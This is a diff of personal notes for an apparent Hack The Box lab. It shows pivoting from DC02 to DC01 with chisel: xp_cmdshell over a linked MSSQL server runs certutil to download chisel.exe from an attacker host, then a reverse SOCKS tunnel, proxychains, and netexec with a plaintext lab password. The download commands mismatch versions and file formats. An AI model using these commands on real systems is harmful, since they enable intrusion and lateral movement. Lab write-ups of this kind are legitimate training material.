@@ -1,6 +1,8 @@
-🔍 DC02 is on an internal network `172.16.20.0/24` with DC01 at `172.16.20.1` as the gateway!
 
-This means DC02 bridges your HTB network and the internal network. We need to pivot through DC02 to reach DC01 internally.
+![[chisel_pivot_schema_v4.svg|891]]
+You need 3 terminals open on Kali simultaneously — one for the MSSQL session, one for chisel server, one for the HTTP server. 🎯
+
+
 
 #powershell_DC2 
 ### 1. Confirm DC01 is at 172.16.20.1
@@ -15,12 +17,24 @@ ping -n 2 172.16.20.1
 ### 2. Kali: prepare and serve chisel
 
 ``` bash
-bash# Install chisel
+# Install chisel
 sudo apt install chisel -y
 
-#Serve it
-cp $(which chisel) /tmp/chisel.exe
+# Check chisel version
+chisel --version
+
+
+#Download Chisel for Windoes
+wget https://github.com/jpillora/chisel/releases/download/v1.11.4/chisel_1.11.4_windows_amd64.zip
+
+#Decompress
+gunzip chisel_1.10.0_windows_amd64.gz
+
+# Move it to /tmp
+mv chisel_1.11.4_windows_amd64 /tmp/chisel.exe
 cd /tmp
+
+#Open a http-server
 python3 -m http.server 8080
 ```
 
@@ -32,6 +46,8 @@ chisel server -p 8000 --reverse
 
 ### 4. DC01 MSSQL session: download chisel to DC02
 
+Run this on the shell from [[RCE as darkzero-ext user svc_sql]].
+
 ```sql
 EXECUTE ('EXEC xp_cmdshell ''certutil -urlcache -split -f http://10.10.14.36:8080/chisel.exe C:\Windows\Temp\chisel.exe''') AT [DC02.darkzero.ext];
 ```
@@ -42,6 +58,9 @@ EXECUTE ('EXEC xp_cmdshell ''certutil -urlcache -split -f http://10.10.14.36:808
 EXECUTE ('EXEC xp_cmdshell ''C:\Windows\Temp\chisel.exe client 10.10.14.36:8000 R:socks''') AT [DC02.darkzero.ext];
 ```
 
+On the chisel shell from point 3 you'll get.
+
+![[Screenshot_2026-03-28_10-23-42.png]]
 ### 6. Kali: configure proxychains
 
 ```bash
@@ -53,10 +72,8 @@ echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains4.conf
 
 ```bash
 proxychains netexec smb 172.16.20.1 -u 'john.w' -p 'RFulUtONCOL!'
-proxychains certipy-ad find -u 'john.w@darkzero.htb' -p 'RFulUtONCOL!' -dc-ip 172.16.20.1 -vulnerable -stdout
 ```
 
-![[Screenshot_2026-03-27_11-17-18.png]]
 
 🟢 Tunnel is working perfectly! *DC01*'s internal interface is reachable through *DC02*. Now run the full attack through the tunnel:
 
